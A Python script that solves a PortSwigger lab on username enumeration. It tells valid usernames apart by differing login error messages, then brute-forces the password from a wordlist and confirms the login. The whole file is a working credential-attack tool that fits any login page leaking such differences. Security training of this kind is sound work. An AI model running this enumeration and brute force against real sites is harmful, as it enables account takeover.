# Lab: Username enumeration via different responses
# Link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
  'http': 'http://127.0.0.1:8080', 
  'https': 'http://127.0.0.1:8080'
}

# send login request
def login(url, username, password):
  """Atempt to login.
  Return values:
    False On any condition not mentioned below
    1 if response contains 'Invalid username' 
    2 if response contains 'Incorrect password'
    3 if response is a redirect, indicating successful login.
  """
  post_data = {'username': username, 'password': password}
  response = requests.post(url, data=post_data, allow_redirects=False, verify=False, proxies=proxies)

  # login successful
  if response.status_code == 302:
    return 3

  response = response.text
  if 'Invalid username' in response:
    return 1

  # valid username found
  if 'Incorrect password' in response:
    return 2

  return False

def enumerate_username(url, username_filename):
  with open(username_filename, 'r') as infile:
    for line in infile:
      username = line.rstrip()
      if login(url, username, 'abcd1234') == 2:
        return username

  return False

def enumerate_password(url, username, passwords_filename):
  with open(passwords_filename, 'r') as infile:
    for line in infile:
      password = line.rstrip()
      if login(url, username, password) == 3:
        return password

  return False

def verify_login(url, username, password):
  data = {
    'username': username, 
    'password': password
  }
  
  response = requests.post(url, data=data, verify=False, proxies=proxies, allow_redirects=True)
  
  return f'Your username is: {username}' in response.text

def main():
  print('[+] Username enumeration via different responses')
  
  try:
    host = sys.argv[1].strip().rstrip('/')
  except IndexError:
    print(f'Usage: {sys.argv[0]} <HOST>')
    print(f'Exampe: {sys.argv[0]} http://www.example.com')
    sys.exit(-1)

  print(f'[+] Brute force username and password')

  url = f'{host}/login'
  username = enumerate_username(f'{url}', '/home/username_anna/Desktop/CS/portswigger/authentication/username.txt')
  if not username:
    print(f'[-] Failed to enumerate username')
    sys.exit(-2)
  print(f'[+] Found username: {username}')

  password = enumerate_password(f'{url}', username, '/home/username_anna/Desktop/CS/portswigger/authentication/password.txt')
  if not password:
    print(f'[-] Failed to enumerate password')
    sys.exit(-3)
  print(f'[+] Found password: {password}')

  if not verify_login(url, username, password):
    print(f'[+] Login not successful')
    sys.exit(-4)
  
  print(f'[+] Login successful')
  print(f'[+] Lab solved')

if __name__ == "__main__":
  main()